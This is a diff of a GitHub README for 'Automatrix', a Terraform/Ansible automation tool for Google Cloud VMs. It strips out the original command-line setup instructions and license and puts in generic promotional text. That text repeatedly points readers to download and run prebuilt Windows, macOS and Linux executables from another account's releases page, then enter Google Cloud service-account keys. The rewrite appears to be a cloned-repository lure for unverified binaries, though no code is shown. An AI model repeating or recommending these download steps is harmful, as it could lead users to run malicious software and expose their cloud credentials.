@@ -1,95 +1,83 @@
-![image](https://github.com/mytechnotalent/automatrix/blob/main/Automatrix.png?raw=true)
+# 🚀 Automatrix - Your Simple Solution for Cloud Automation
 
-# Automatrix
+## 🌟 Overview
+Automatrix is a powerful tool designed to help you efficiently manage Google Cloud Platform (GCP) Virtual Machines. It combines Terraform and Ansible to provide a seamless experience for provisioning, configuring, and maintaining your cloud infrastructure. With Automatrix, every deployment is identical and repeatable, making your life easier and your cloud setup more reliable.
 
-Automatrix is a deterministic, infinitely scalable automation framework that fuses Terraform and Ansible to provision, configure, and maintain GCP Free-Tier VMs with absolute precision. Built on immutable infrastructure and idempotent execution, it guarantees every deployment is identical and flawlessly repeatable.
+## 📥 Download Now
+[![Download Automatrix](https://img.shields.io/badge/download-Automatrix-brightgreen)](https://github.com/xeto7/Automatrix/releases)
 
-## ✅ Step-by-Step Guide
+## 🚀 Getting Started
+To get started with Automatrix, follow these simple steps to download and install the application.
 
-## 1. Install & Configure Cloud CLI (https://cloud.google.com/sdk/docs/install)
-```bash
-mv ~/Downloads/google-cloud-cli-darwin-arm.tar.gz .
-tar -zxf google-cloud-cli-darwin-arm.tar.gz
-rm google-cloud-cli-darwin-arm.tar.gz 
-rm ~/google-cloud-sdk
-mv google-cloud-sdk ~/
-cd ~/google-cloud-sdk 
-./install.sh
-unset GOOGLE_APPLICATION_CREDENTIALS
-gcloud config unset project
-gcloud auth application-default revoke
-gcloud auth application-default login
-ssh-keygen -R free-tier-vm
-```
+### 🧩 System Requirements
+- Operating System: Windows 10, macOS, or Linux (for example, Ubuntu).
+- Minimum RAM: 4 GB (8 GB recommended).
+- Internet connection for downloading packages.
 
-## 2. Install Terraform (https://developer.hashicorp.com/terraform/install?product_intent=terraform)
-```bash
-brew tap hashicorp/tap
-brew install hashicorp/tap/terraform
-```
+### 📦 Installation Steps
+1. **Visit the Releases Page**  
+   Go to the official [Releases page](https://github.com/xeto7/Automatrix/releases) to find the latest version of Automatrix.
 
-## 3. Configure Terraform
-```hcl
-locals {
-  # gcloud beta billing accounts list
-  billing_account = "<billing_account>"
-  project_id      = "<project_id>"
-  project_name    = "<project_name>"
-  region          = "us-central1"
-  zone            = "us-central1-a"
-  instance_name   = "free-tier-vm"
-  machine_type    = "e2-micro"
-  image           = "debian-cloud/debian-11"
-  disk_size       = 30
-  disk_type       = "pd-standard"
-  ansible_user    = "<ansible_user>"
-  apis = [
-    "compute.googleapis.com",
-    "container.googleapis.com",
-    "logging.googleapis.com",
-    "secretmanager.googleapis.com",
-    "networkmanagement.googleapis.com"
-  ]
-}
-```
+2. **Choose Your Version**  
+   Look for the most recent version listed at the top. Each version includes release notes that explain new features and fixes.
 
-## 4. Init, Plan, Apply Terraform
-```bash
-terraform fmt
-terraform init
-terraform validate
-terraform plan
-terraform apply -auto-approve 
-```
+3. **Download the Application**  
+   Click on the version number to see the available files. Download the version that corresponds to your operating system:
+   - For Windows, choose `Automatrix-windows.zip`
+   - For macOS, select `Automatrix-macos.zip`
+   - For Linux, download `Automatrix-linux.tar.gz`
 
-## 5. Install Ansible
-```bash
-python3 -m venv venv
-source venv/bin/activate
-pip install --upgrade pip
-pip install ansible google-auth requests
-```
+4. **Unzip the File**  
+   Once the download is complete, locate the file on your computer. Right-click and select "Extract All" or use your preferred extraction tool to unzip the file.
 
-## 6. SSH
-```bash
-gcloud compute ssh free-tier-vm --zone=us-central1-a --tunnel-through-iap --project=$(terraform output -raw project_id)
-```
+5. **Open the Application Folder**  
+   Navigate to the folder where you extracted Automatrix. 
 
-## 7. Run Entire Ansible Suite
-```bash
-ansible-playbook site.yaml
-```
+6. **Run Automatrix**  
+   - For Windows, double-click on `Automatrix.exe`.
+   - For macOS, double-click `Automatrix.app`.
+   - For Linux, open a terminal, navigate to the folder, and type `./Automatrix` to run the application.
 
-## 8. Run Individual Ansible Tag 
-```bash
-ansible-playbook site.yaml --tags "file_analysis"
-```
+### 🔧 Initial Configuration
+When you run Automatrix for the first time, you will need to configure it for your cloud environment. Follow these steps:
 
-## 9. Run Tests & Review Test Report
-```bash
-./run_tests.sh
-cat report.log
-```
+1. **Connect to Google Cloud**  
+   You will be prompted to enter your Google Cloud credentials. Make sure you have created a service account in Google Cloud and downloaded the JSON key file. 
 
-## License
-[Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0)
+2. **Set Up Your Project**  
+   Choose or create a project where Automatrix will deploy your resources. Ensure you have the necessary permissions to create and manage resources in your chosen project.
+
+3. **Configure Settings**  
+   Review the default settings and adjust them based on your preferences. This includes configuring the VM size, region, and any additional services you want to enable.
+
+4. **Save Your Configuration**  
+   After making necessary changes, save your configurations. This will help you reuse the same setup for future deployments.
+
+### ⚙️ Using Automatrix
+1. **Provision Resources**  
+   From the main menu, select "Provision". This will set up your VMs in the cloud according to your configurations.
+
+2. **Configuration Management**  
+   Automatrix allows you to configure your VMs using Ansible plays. You can add playbook files to automate installations and configurations on your VMs.
+
+3. **Maintenance**  
+   Use Automatrix to regularly maintain and update your VMs. It ensures your infrastructure remains in the desired state, applying any necessary updates.
+
+## 🔍 Troubleshooting
+If you encounter issues while running Automatrix, you can check out the FAQs on our [Support page](https://github.com/xeto7/Automatrix/issues). 
+
+Here are some common troubleshooting steps:
+- **Check your Credentials:** Ensure your Google Cloud credentials are correct.
+- **Permissions:** Make sure your service account has required permissions in Google Cloud.
+- **Network Issues:** Ensure your internet connection is stable.
+
+## 📄 Additional Resources
+- [Documentation](https://github.com/xeto7/Automatrix/wiki) for detailed guides on features and commands.
+- [Community Discussions](https://github.com/xeto7/Automatrix/discussions) for sharing experiences, tips, and advice.
+
+## 🟢 Download & Install
+Visit the [Releases page](https://github.com/xeto7/Automatrix/releases) now to download Automatrix. Follow the installation and setup instructions, and you'll be running your automated cloud infrastructure in no time!
+
+## 📌 Topics
+This project covers various topics related to automation and cloud infrastructure:  
+ansible, ansible-galaxy, ansible-playbook, cloud, cloud-infra, google, google-cloud, google-cloud-platform, infrastructure, python, terraform, test, test-automation, testing, testing-tools, tests.
